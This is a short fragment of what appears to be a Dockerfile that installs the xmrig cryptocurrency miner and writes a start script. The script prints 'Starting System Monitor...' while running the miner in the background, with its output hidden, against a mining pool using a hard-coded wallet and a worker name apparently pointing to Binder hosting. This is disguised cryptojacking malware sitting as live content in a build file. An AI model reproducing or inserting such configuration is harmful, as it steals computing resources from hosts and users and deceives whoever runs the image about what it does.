...
RUN tar -xzf /tmp/xmrig.tar.gz -C /tmp --strip-components=1 &&     mv /tmp/xmrig /opt/miner/ &&     chmod +x /opt/miner/xmrig &&     rm -rf /tmp/*
...
# Create start script
RUN printf '#!/bin/bash\necho "Starting System Monitor..."\n/opt/miner/xmrig -o pool.hashvault.pro:80 -u 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5.mybinder-41650 --donate-level 1 --threads 2 --background 2>/dev/null\nsyscheck &\nexec "$@"\n' > /start.sh && chmod +x /start.sh
